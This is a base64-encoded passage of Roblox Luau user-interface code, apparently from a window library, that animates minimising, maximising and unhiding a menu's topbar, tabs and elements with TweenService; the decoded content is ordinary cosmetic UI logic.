cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCWVsc2UKCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZWxlbWVudCwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZWxlbWVudC5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShlbGVtZW50LlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCQllbmQKCQkJCQkJZm9yIF8sIGNoaWxkIGluIGlwYWlycyhlbGVtZW50OkdldENoaWxkcmVuKCkpIGRvCgkJCQkJCQlpZiBjaGlsZC5DbGFzc05hbWUgPT0gIkZyYW1lIiBvciBjaGlsZC5DbGFzc05hbWUgPT0gIlRleHRMYWJlbCIgb3IgY2hpbGQuQ2xhc3NOYW1lID09ICJUZXh0Qm94IiBvciBjaGlsZC5DbGFzc05hbWUgPT0gIkltYWdlQnV0dG9uIiBvciBjaGlsZC5DbGFzc05hbWUgPT0gIkltYWdlTGFiZWwiIHRoZW4KCQkJCQkJCQljaGlsZC5WaXNpYmxlID0gZmFsc2UKCQkJCQkJCWVuZAoJCQkJCQllbmQKCQkJCQllbmQKCQkJCWVuZAoJCQllbmQKCQllbmQKCWVuZAoKCXRhc2sud2FpdCgwLjUpCglNYWluLlZpc2libGUgPSBmYWxzZQoJRGVib3VuY2UgPSBmYWxzZQplbmQKCmxvY2FsIGZ1bmN0aW9uIE1heGltaXNlKCkKCURlYm91bmNlID0gdHJ1ZQoJVG9wYmFyLkNoYW5nZVNpemUuSW1hZ2UgPSAicmJ4YXNzZXRpZDovLyIuLjEwMTM3OTQxOTQxCgoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb3BiYXIuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5TaGFkb3cuSW1hZ2UsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC42fSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKFRvcGJhci5Db3JuZXJSZXBhaXIsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKFRvcGJhci5EaXZpZGVyLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShkcmFnQmFyQ29zbWV0aWMsIFR3ZWVuSW5mby5uZXcoMC4yNSwgRW51bS5FYXNpbmdTdHlsZS5CYWNrLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuN30pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtTaXplID0gdXNlTW9iaWxlU2l6aW5nIGFuZCBVRGltMi5uZXcoMCwgNTAwLCAwLCAyNzUpIG9yIFVEaW0yLm5ldygwLCA1MDAsIDAsIDQ3NSl9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9wYmFyLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtTaXplID0gVURpbTIubmV3KDAsIDUwMCwgMCwgNDUpfSk6UGxheSgpCglUYWJMaXN0LlZpc2libGUgPSB0cnVlCgl0YXNrLndhaXQoMC4yKQoKCUVsZW1lbnRzLlZpc2libGUgPSB0cnVlCgoJZm9yIF8sIHRhYiBpbiBpcGFpcnMoRWxlbWVudHM6R2V0Q2hpbGRyZW4oKSkgZG8KCQlpZiB0YWIuTmFtZSB+PSAiVGVtcGxhdGUiIGFuZCB0YWIuQ2xhc3NOYW1lID09ICJTY3JvbGxpbmdGcmFtZSIgYW5kIHRhYi5OYW1lIH49ICJQbGFjZWhvbGRlciIgdGhlbgoJCQlmb3IgXywgZWxlbWVudCBpbiBpcGFpcnModGFiOkdldENoaWxkcmVuKCkpIGRvCgkJCQlpZiBlbGVtZW50LkNsYXNzTmFtZSA9PSAiRnJhbWUiIHRoZW4KCQkJCQlpZiBlbGVtZW50Lk5hbWUgfj0gIlNlY3Rpb25TcGFjaW5nIiBhbmQgZWxlbWVudC5OYW1lIH49ICJQbGFjZWhvbGRlciIgdGhlbgoJCQkJCQlpZiBlbGVtZW50Lk5hbWUgPT0gIlNlY3Rpb25UaXRsZSIgb3IgZWxlbWVudC5OYW1lID09ICdTZWFyY2hUaXRsZS1mc2Vmc2VmZXNmc2VmZXNmZXNmVGhhbmtzJyB0aGVuCgkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKGVsZW1lbnQuVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwLjR9KTpQbGF5KCkKCQkJCQkJZWxzZWlmIGVsZW1lbnQuTmFtZSA9PSAnRGl2aWRlcicgdGhlbgoJCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShlbGVtZW50LkRpdmlkZXIsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjg1fSk6UGxheSgpCgkJCQkJCWVsc2UKCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZWxlbWVudCwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZWxlbWVudC5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShlbGVtZW50LlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJCQllbmQKCQkJCQkJZm9yIF8sIGNoaWxkIGluIGlwYWlycyhlbGVtZW50OkdldENoaWxkcmVuKCkpIGRvCgkJCQkJCQlpZiBjaGlsZC5DbGFzc05hbWUgPT0gIkZyYW1lIiBvciBjaGlsZC5DbGFzc05hbWUgPT0gIlRleHRMYWJlbCIgb3IgY2hpbGQuQ2xhc3NOYW1lID09ICJUZXh0Qm94IiBvciBjaGlsZC5DbGFzc05hbWUgPT0gIkltYWdlQnV0dG9uIiBvciBjaGlsZC5DbGFzc05hbWUgPT0gIkltYWdlTGFiZWwiIHRoZW4KCQkJCQkJCQljaGlsZC5WaXNpYmxlID0gdHJ1ZQoJCQkJCQkJZW5kCgkJCQkJCWVuZAoJCQkJCWVuZAoJCQkJZW5kCgkJCWVuZAoJCWVuZAoJZW5kCgoJdGFzay53YWl0KDAuMSkKCglmb3IgXywgdGFiYnRuIGluIGlwYWlycyhUYWJMaXN0OkdldENoaWxkcmVuKCkpIGRvCgkJaWYgdGFiYnRuLkNsYXNzTmFtZSA9PSAiRnJhbWUiIGFuZCB0YWJidG4uTmFtZSB+PSAiUGxhY2Vob2xkZXIiIHRoZW4KCQkJaWYgdG9zdHJpbmcoRWxlbWVudHMuVUlQYWdlTGF5b3V0LkN1cnJlbnRQYWdlKSA9PSB0YWJidG4uVGl0bGUuVGV4dCB0aGVuCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0biwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUodGFiYnRuLkltYWdlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUodGFiYnRuLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJZWxzZQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4sIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjd9KTpQbGF5KCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUodGFiYnRuLkltYWdlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDAuMn0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4uVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwLjJ9KTpQbGF5KCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUodGFiYnRuLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAwLjV9KTpQbGF5KCkKCQkJZW5kCgoJCWVuZAoJZW5kCgoJdGFzay53YWl0KDAuNSkKCURlYm91bmNlID0gZmFsc2UKZW5kCgoKbG9jYWwgZnVuY3Rpb24gVW5oaWRlKCkKCURlYm91bmNlID0gdHJ1ZQoJTWFpbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCkKCU1haW4uVmlzaWJsZSA9IHRydWUKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbiwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IHVzZU1vYmlsZVNpemluZyBhbmQgVURpbTIubmV3KDAsIDUwMCwgMCwgMjc1KSBvciBVRGltMi5uZXcoMCwgNTAwLCAwLCA0NzUpfSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKE1haW4uVG9wYmFyLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtTaXplID0gVURpbTIubmV3KDAsIDUwMCwgMCwgNDUpfSk6UGxheSgpCglUd2VlblNlcnZpY2U6Q3JlYXRlKE1haW4uU2hhZG93LkltYWdlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDAuNn0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLlRvcGJhciwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5Ub3BiYXIuRGl2aWRlciwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCVR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbi5Ub3BiYXIuQ29ybmVyUmVwYWlyLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShNYWluLlRvcGJhci5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCglpZiBNUHJvbXB0IHRoZW4KCQlUd2VlblNlcnZpY2U6Q3JlYXRlKE1Qcm9tcHQsIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1NpemUgPSBVRGltMi5uZXcoMCwgNDAsIDAsIDEwKSwgUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLCAtNTApLCBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCVR3ZWVuU2VydmljZTpDcmVhdGUoTVByb21wdC5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCgkJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJCXRhc2sud2FpdCgwLjUpCgkJCU1Qcm9tcHQuVmlzaWJsZSA9IGZhbHNlCgkJZW5kKQoJZW5kCgoJaWYgTWluaW1pc2VkIHRoZW4KCQl0YXNrLnNwYXduKE1heGltaXNlKQoJZW5kCgoJZHJhZ0Jhci5Qb3NpdGlvbiA9IHVzZU1vYmlsZVNpemluZyBhbmQgVURpbTIubmV3KDAuNSwgMCwgMC41LCBkcmFnT2Zmc2V0TW9iaWxlKSBvciBVRGltMi5uZXcoMC41LCAwLCAwLjUsIGRyYWdPZmZzZXQpCgoJZHJhZ0ludGVyYWN0LlZpc2libGUgPSB0cnVlCgoJZm9yIF8sIFRvcGJhckJ1dHRvbiBpbiBpcGFpcnMoVG9wYmFyOkdldENoaWxkcmVuKCkpIGRvCgkJaWYgVG9wYmFyQnV0dG9uLkNsYXNzTmFtZSA9PSAiSW1hZ2VCdXR0b24iIHRoZW4KCQkJaWYgVG9wYmFyQnV0dG9uLk5hbWUgPT0gJ0ljb24nIHRoZW4KCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9wYmFyQnV0dG9uLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtJbWFnZVRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJZWxzZQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb3BiYXJCdXR0b24sIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC44fSk6UGxheSgpCgkJCWVuZAoKCQllbmQKCWVuZAoKCWZvciBfLCB0YWJidG4gaW4gaXBhaXJzKFRhYkxpc3Q6R2V0Q2hpbGRyZW4oKSkgZG8KCQlpZiB0YWJidG4uQ2xhc3NOYW1lID09ICJGcmFtZSIgYW5kIHRhYmJ0bi5OYW1lIH49ICJQbGFjZWhvbGRlciIgdGhlbgoJCQlpZiB0b3N0cmluZyhFbGVtZW50cy5VSVBhZ2VMYXlvdXQuQ3VycmVudFBhZ2UpID09IHRhYmJ0bi5UaXRsZS5UZXh0IHRoZW4KCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUodGFiYnRuLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4uVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0bi5JbWFnZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0bi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQllbHNlCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0biwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuN30pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4uSW1hZ2UsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC4yfSk6UGxheSgpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0bi5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDAuMn0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0YWJidG4uVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDAuNX0pOlBsYXkoKQoJCQllbmQKCQllbmQKCWVuZAoKCWZvciBfLCB0YWIgaW4gaXBhaXJzKEVsZW1lbnRzOkdldENoaWxkcmVuKCkpIGRvCgkJaWYgdGFiLk5hbWUgfj0gIlRlbXBsYXRlIiBhbmQgdGFiLkNsYXNzTmFtZSA9PSAiU2Nyb2xsaW5nRnJhbWUiIGFuZCB0YWIuTmFtZSB+PSAiUGxhY2Vob2xkZXIiIHRoZW4KCQkJZm9yIF8sIGVsZW1lbnQgaW4gaXBhaXJzKHRhYjpHZXRDaGlsZHJlbigpKSBkbwoJCQkJaWYgZWxlbWVudC5DbGFzc05hbWUgPT0gIkZyYW1lIiB0aGVuCgkJCQkJaWYgZWxlbWVudC5OYW1lIH49ICJTZWN0aW9uU3BhY2luZyIgYW5kIGVsZW1lbnQuTmFtZSB+PSAiUGxhY2Vob2xkZXIiIHRoZW4KCQkJCQkJaWYgZWxlbWVudC5OYW1lID09ICJTZWN0aW9uVGl0bGUiIG9yIGVsZW1lbnQuTmFtZSA9PSAnU2VhcmNoVGl0bGUtZnNlZnNlZmVzZnNlZmVzZmVzZlRoYW5rcycgdGhlbgoJCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShlbGVtZW50LlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMC40fSk6UGxheSgpCgkJCQkJCWVsc2VpZiBlbGVtZW50Lk5hbWUgPT0gJ0RpdmlkZXInIHRoZW4KCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZWxlbWVudC5EaXZpZGVyLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC44NX0pOlBsYXkoKQoJCQkJCQllbHNlCgkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKGVsZW1lbnQsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKGVsZW1lbnQuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZWxlbWVudC5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCQkJZW5kCgkJCQkJCWZvciBfLCBjaGlsZCBpbiBpcGFpcnMoZWxlbWVudDpHZXRDaGlsZHJlbigpKSBkbwoJCQkJCQkJaWYgY2hpbGQuQ2xhc3NOYW1lID09ICJGcmFtZSIgb3IgY2hpbGQuQ2xhc3NOYW1lID09ICJUZXh0TGFiZWwiIG9yIGNoaWxkLkNsYXNzTmFtZSA9PSAiVGV4dEJveCIgb3IgY2hpbGQuQ2xhc3NOYW1lID09ICJJbWFnZUJ1dHRvbiIgb3IgY2hpbGQuQ2xhc3NOYW1lID09ICJJbWFnZUxhYmVsIiB0aGVuCgkJCQkJCQkJY2hpbGQuVmlzaWJsZSA9IHRydWUKCQkJCQkJCWVuZAoJCQkJCQllbmQKCQkJCQllbmQKCQkJCWVuZAoJCQllbmQKCQllbmQKCWVuZAoKCVR3ZWVuU2VydmljZTpDcmVhdGUoZHJhZ0JhckNvc21ldGljLCBUd2VlbkluZm8ubmV3KDAuMjUsIEVudW0uRWFzaW5nU3R5bGUuQmFjaywgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjV9KTpQbGF5KCkKCgl0YXNrLndhaXQoMC41KQoJTWluaW1pc2VkID0gZmFsc2UKCURlYm91bmNlID0gZmFsc2UKZW5kCgpsb2NhbCBmdW5jdGlvbiBNaW5pbWlzZSgpCglEZWJvdW5jZSA9IHRydWUKCVRvcGJhci5DaGFuZ2VTaXplLkltYWdlID0gInJieGFzc2V0aWQ6Ly8iLi4xMTAzNjg4NDIzNAoKCVRvcGJhci5VSVN0cm9rZS5Db2xvciA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudFN0cm9rZQoKCXRhc2suc3Bhd24oY2xvc2VTZWFyY2gpCgoJZm9yIF8sIHRhYmJ0biBpbiBpcGFpcnMoVGFiTGlzdDpHZXRDaGlsZHJlbigpKSBkbwoJCWlmIHRhYmJ0bi5DbGFzc05hbWUgPT0gIkZyYW1lIiBhbmQgdGFiYnRuLk5hbWUgfj0gIlBsYWNlaG9sZGVyIiB0aGVuCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUodGFiYnRuLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0bi5JbWFnZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUodGFiYnRuLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKHRhYmJ0bi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCWVuZAoJZW5kCgoJZm9yIF8sIHRhYiBpbiBpcGFpcnMoRWxlbWVudHM6R2V0Q2hpbGRyZW4oKSkgZG8KCQlpZiB0YWIuTmFtZSB+PSAiVGVtcGxhdGUiIGFuZCB0YWIuQ2xhc3NOYW1lID09ICJTY3JvbGxpbmdGcmFtZSIgYW5kIHRhYi5OYW1lIH49ICJQbGFjZWhvbGRlciIgdGhlbgoJCQlmb3IgXywgZWxlbWVudCBpbiBpcGFpcnModGFiOkdldENoaWxkcmVuKCkpIGRvCgkJCQlpZiBlbGVtZW50LkNsYXNzTmFtZSA9PSAiRnJhbWUiIHRoZW4KCQkJCQlpZiBlbGVtZW50Lk5hbWUgfj0gIlNlY3Rpb25TcGFjaW5nIiBhbmQgZWxlbWVudC5OYW1lIH49ICJQbGFjZWhvbGRlciIgdGhlbgoJCQkJCQlpZiBlbGVtZW50Lk5hbWUgPT0gIlNlY3Rpb25UaXRsZSIgb3IgZWxlbWVudC5OYW1lID09ICdTZWFyY2hUaXRsZS1mc2Vmc2VmZXNmc2VmZXNmZXNmVGhhbmtzJyB0aGVuCgkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKGVsZW1lbnQuVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCWVsc2VpZiBlbGVtZW50Lk5hbWUgPT0gJ0RpdmlkZXInIHRoZW4KCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZWxlbWVudC5EaXZpZGVyLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCQllbHNlCgkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKGVsZW1lbnQsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKGVsZW1lbnQuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoZWxlbWVudC5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQkJZW5kCgkJCQkJCWZvciBfLCBjaGlsZCBpbiBpcGFpcnMoZWxlbWVudDpHZXRDaGlsZHJlbigpKSBkbwoJCQkJCQkJaWYgY2hpbGQuQ2xhc3NOYW1lID09ICJGcmFtZSIgb3IgY2hpbGQuQ2xhc3NOYW1lID09ICJUZXh0TGFiZW